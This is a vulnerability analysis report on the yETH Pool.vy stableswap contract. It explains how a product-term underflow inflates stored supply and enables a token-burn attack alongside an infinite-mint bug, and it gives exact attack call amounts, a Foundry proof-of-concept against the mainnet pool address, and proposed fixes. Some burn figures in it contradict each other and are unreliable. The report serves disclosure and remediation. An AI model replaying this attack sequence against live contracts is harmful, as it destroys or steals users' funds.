# yETH Pool.vy Vulnerability Analysis Report

## Overview

This document contains a complete analysis of a critical vulnerability in the yETH weighted stableswap pool contract (Pool.vy). The vulnerability allows an attacker to burn approximately 1/3 of the outstanding yETH supply through carefully crafted liquidity operations.

## Contract Information

- **Contract**: Pool.vy (Vyper 0.3.10)
- **Location**: `/home/schlag/v3/yETH-hack/src/Pool.vy`
- **POC Test**: `/home/schlag/v3/yETH-hack/test/Hack.t.sol`
- **Math Proof Test**: `/home/schlag/v3/yETH-hack/test/MathProof.t.sol`
- **Attack Block**: 23914086 (Ethereum mainnet)

## Executive Summary

The vulnerability has **two components**:

1. **Supply Inflation Bug (Root Cause)**: The product term `vb_prod` can underflow to 0 during `add_liquidity` operations due to cumulative multiplication by small factors. When `vb_prod = 0`, the `_calc_supply` function calculates an inflated supply value that gets stored. Later operations that recalculate `vb_prod` correctly trigger a "correction" that burns tokens.

2. **Infinite Mint Bug (Secondary)**: The use of `unsafe_sub` at line 1274 can cause integer underflow when the pool is in an extreme state, allowing infinite token minting.

**Important**: Fixing only the `unsafe_sub` (line 1274) does NOT prevent the supply burn attack. The root cause is the `vb_prod` underflow to 0.

---

## Mathematical Proof: Why vb_prod Becomes 0

### The Formula (add_liquidity line 474)

```vyper
vb_prod_final = vb_prod_final * self._pow_up(prev_vb * PRECISION / vb, wn) / PRECISION
```

For each asset where liquidity is added:
- `prev_vb` = virtual balance before
- `vb` = virtual balance after (larger)
- `wn` = weight * num_assets
- Multiplier = `(prev_vb/vb)^wn`

### Actual Values from 5th add_liquidity

| Asset | prev_vb | new_vb | Ratio | Weight | wn | Factor |
|-------|---------|--------|-------|--------|-----|--------|
| 0 (sfrxETH) | 684.9e18 | 2722.8e18 | 0.251 | 20% | 1.6 | 0.095 |
| 1 (wstETH) | 684.9e18 | 2722.8e18 | 0.251 | 20% | 1.6 | 0.095 |
| 2 (ETHx) | 410.4e18 | 1632.5e18 | 0.251 | 10% | 0.8 | 0.344 |
| 3 (cbETH) | unchanged | unchanged | 1.0 | 10% | - | 1.0 |
| 4 (rETH) | 410.4e18 | 1632.5e18 | 0.251 | 10% | 0.8 | 0.344 |
| 5 (apxETH) | 549.1e18 | 2187.8e18 | 0.251 | 25% | 2.0 | 0.063 |
| 6 (WOETH) | unchanged | unchanged | 1.0 | 2.5% | - | 1.0 |
| 7 (mETH) | unchanged | unchanged | 1.0 | 2.5% | - | 1.0 |

### Cumulative Effect

```
Cumulative factor = 0.095 * 0.095 * 0.344 * 0.344 * 0.063
                  = 0.0000067 (6.7e-6)

Starting vb_prod = 42.2e18
Expected after   = 42.2e18 * 0.0000067 = 283,000 (2.83e5)
```

This value (283,000) is so small that it **rounds to 0** in fixed-point arithmetic when divided by PRECISION (1e18) during the `_pow_up` calculation.

---

## Technical Analysis

### Key Data Structures

```vyper
supply: public(uint256)                    # LP token supply (the invariant D)
packed_pool_vb: uint256                    # Packed: vb_prod (128 bits) | vb_sum (128 bits)
# vb_prod: π (pi), product term = product((w_i * D / x_i)^(w_i * n))
# vb_sum: σ (sigma), sum term = sum(x_i) where x_i is virtual balance of asset i
```

### The Invariant Formula

The pool uses a weighted stableswap invariant. The supply `D` is calculated iteratively:

```
D[m+1] = (A * f^n * σ - D[m] * π[m]) / (A * f^n - 1)
```

Where:
- `A` = amplification factor
- `σ` = vb_sum = sum of virtual balances
- `π` = vb_prod = product term
- `D` = supply (the invariant)

### Vulnerable Code Location 1: add_liquidity (lines 474, 480)

```vyper
# Line 474 - Product term update (can underflow to 0)
vb_prod_final = vb_prod_final * self._pow_up(prev_vb * PRECISION / vb, wn) / PRECISION
```

When adding liquidity:
- `vb > prev_vb` (new balance > old balance)
- `prev_vb / vb < 1`
- With large exponents `wn = weight * num_assets`, repeated multiplications can underflow to 0

### Vulnerable Code Location 2: _calc_supply (line 1274)

```vyper
# Original vulnerable code:
sp: uint256 = unsafe_div(unsafe_sub(l, unsafe_mul(s, r)), d)

# With safe math (prevents infinite mint but NOT supply burn):
sp: uint256 = (l - s * r) / d
```

### Why vb_prod = 0 Causes Wrong Supply

In `_calc_supply` when `vb_prod = 0`:

```python
# The iteration formula:
sp = (A * vb_sum - supply * vb_prod) / (A - 1)

# When vb_prod = 0:
sp = (A * vb_sum - supply * 0) / (A - 1)
sp = (A * vb_sum) / (A - 1)
sp ≈ vb_sum * (1 + 1/A)  # INFLATED value!

# The product term update also stays 0:
r = r * sp / s  # 0 * anything = 0
```

The iteration converges to an **inflated** supply ≈ `vb_sum * A/(A-1)` instead of the correct invariant.

### remove_liquidity Recalculates vb_prod Correctly

```vyper
# Line 547: vb_prod starts fresh
vb_prod: uint256 = PRECISION  # = 1e18

# Line 563: Recalculated from scratch
vb_prod = unsafe_div(unsafe_mul(vb_prod, self._pow_down(
    unsafe_div(unsafe_mul(supply, weight), vb),
    unsafe_mul(weight, num_assets)
)), PRECISION)
```

This produces a correct non-zero `vb_prod` value based on current state.

---

## Attack Sequence

### Step 1: Inflate Supply (vb_prod → 0)

```solidity
// Imbalanced add_liquidity calls - some assets set to 0
addAmounts[0] = 1784169320136805803209;  // sfrxETH
addAmounts[1] = 1669558029141448703194;  // wstETH
addAmounts[2] = 1135991585797559066395;  // ETHx
addAmounts[3] = 0;                        // cbETH - ZERO
addAmounts[4] = 1061079136814511050837;  // rETH
addAmounts[5] = 1488254960317842892500;  // apxETH
addAmounts[6] = 0;                        // WOETH - ZERO
addAmounts[7] = 0;                        // mETH - ZERO
POOL.add_liquidity(addAmounts, 0, bad_tapir);
```

After this call: `vb_prod = 0`, but `self.supply` is set to an inflated value.

### Step 2: Recalculate vb_prod

```solidity
// remove_liquidity(0) recalculates vb_prod from scratch
POOL.remove_liquidity(0, new uint256[](8), bad_tapir);
```

After this: `vb_prod ≈ 0.09e18` (small but non-zero, reflects pool imbalance)

### Step 3: Trigger Supply Correction (Burn)

```solidity
// update_rates triggers _calc_supply with correct vb_prod
uint256[] memory rates2 = new uint256[](1);
rates2[0] = 6;  // Update WOETH rate
POOL.update_rates(rates2);
```

This calls `_update_supply()` which:
1. Calls `_calc_supply()` with the non-zero `vb_prod`
2. Calculates correct (lower) supply
3. Burns the difference from staking contract

### Test Output Evidence

```
vb_prod after fifth add_liquidity 0         # vb_prod underflowed to 0
vb_sum after fifth add_liquidity 10903169054856814420725

vb_prod after remove_liquidity(0) 90945836081899227876  # recalculated correctly
vb_sum after remove_liquidity(0) 10926185622950009605077

Supply before update_rates 10950520112087983995463     # INFLATED supply
YETH.totalSupply() before: 11420520112087983995463
YETH.totalSupply() after:  10454512380851924527223     # BURNED ~966e18 tokens!
```

The burn happens because:
1. `self.supply` was inflated to ~10950e18 when `vb_prod` was 0
2. `_calc_supply` with correct non-zero `vb_prod` returns ~10454e18
3. The difference (~496e18) is burned at line 1167

---

## The Fix

### Root Cause Fix: Prevent vb_prod = 0

Add assertions after `_calc_supply` calls in `add_liquidity`:

```vyper
# After line 503 (first _calc_supply call):
supply, vb_prod = self._calc_supply(num_assets, supply, self.amplification, vb_prod, vb_sum, prev_supply == 0)
assert vb_prod > 0 # dev: vb_prod underflow  # <-- ADD THIS

# After line 513 (second _calc_supply call for fees):
supply_final, vb_prod_final = self._calc_supply(num_assets, prev_supply, self.amplification, vb_prod_final, vb_sum_final, True)
assert vb_prod_final > 0 # dev: vb_prod underflow  # <-- ADD THIS
```

### Secondary Fix: Safe Math (Already Applied)

Replace unsafe math at line 1274:

```vyper
# Original (vulnerable):
sp: uint256 = unsafe_div(unsafe_sub(l, unsafe_mul(s, r)), d)

# Fixed:
sp: uint256 = (l - s * r) / d
```

**Note**: This only prevents the final infinite mint, NOT the supply burn.

---

## Verification

### Before Fix (Original Code)

```
Test: PASS
- vb_prod underflows to 0 during 5th add_liquidity
- Supply is inflated and stored
- update_rates burns ~966e18 tokens (per call, 3 times)
- Total burned: ~2.89M tokens (~1/3 of supply)
- Final add_liquidity returns astronomically large value (infinite mint)
```

### After Fix (With Assertions)

```
Test: FAIL (Expected - attack prevented)
- Test reverts during 5th add_liquidity
- Assertion `vb_prod > 0` catches the underflow
- Supply inflation never stored
- Attack stopped at root cause
```

---

## Complete POC Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IPool} from "./interfaces/IPool.sol";
import {IOETH} from "./interfaces/IOETH.sol";
import "forge-std/Test.sol";

contract HackTests is Test {
    IPool public constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 public constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);

    function setUp() public virtual {
        uint256 _blockNumber = 23914085;
        vm.selectFork(vm.createFork(vm.envString("ETH_RPC_URL"), _blockNumber));
        // Deploy local Pool.vy and etch to mainnet address
        // ... (setup code)
    }

    function test_attack() public {
        address bad_tapir = address(69);
        vm.startPrank(bad_tapir);

        // Setup: deal tokens and approve
        for (uint256 i = 0; i < 8; i++) {
            address asset = POOL.assets(i);
            deal(asset, bad_tapir, 20_000e18);
            IERC20(asset).approve(address(POOL), type(uint256).max);
        }

        // Step 1: Initial rate update
        uint256[] memory rates = new uint256[](8);
        rates[0] = 0; rates[1] = 1; rates[2] = 2; rates[3] = 3;
        rates[4] = 4; rates[5] = 5; rates[6] = 0; rates[7] = 0;
        POOL.update_rates(rates);

        // Step 2: Series of imbalanced add/remove to drive vb_prod to 0
        // ... (multiple add_liquidity and remove_liquidity calls)

        // Step 3: remove_liquidity(0) to recalculate vb_prod
        POOL.remove_liquidity(0, new uint256[](8), bad_tapir);

        // Step 4: update_rates triggers burn
        uint256[] memory rates2 = new uint256[](1);
        rates2[0] = 6;
        POOL.update_rates(rates2);  // Burns ~966e18 tokens!

        // Repeat steps 2-4 to burn more...
    }
}
```

---

## Files Modified

1. **`/home/schlag/v3/yETH-hack/src/Pool.vy`**:
   - Line 504: Added `assert vb_prod > 0`
   - Line 514: Added `assert vb_prod_final > 0`
   - Line 1276: Changed to safe math (already done by user)

---

## Summary

| Issue | Location | Impact | Fix |
|-------|----------|--------|-----|
| vb_prod underflow to 0 | add_liquidity lines 474, 480 | Supply inflation → burn attack | Assert vb_prod > 0 after _calc_supply |
| unsafe_sub underflow | _calc_supply line 1274 | Infinite mint | Use safe math |

The root cause is the `vb_prod` underflow to 0, which allows attackers to:
1. Inflate the stored supply value
2. Later trigger a "correction" that burns tokens from the staking contract
3. Repeat to drain ~1/3 of total supply

The fix adds assertions to prevent `vb_prod` from ever being stored as 0, stopping the attack at its source.
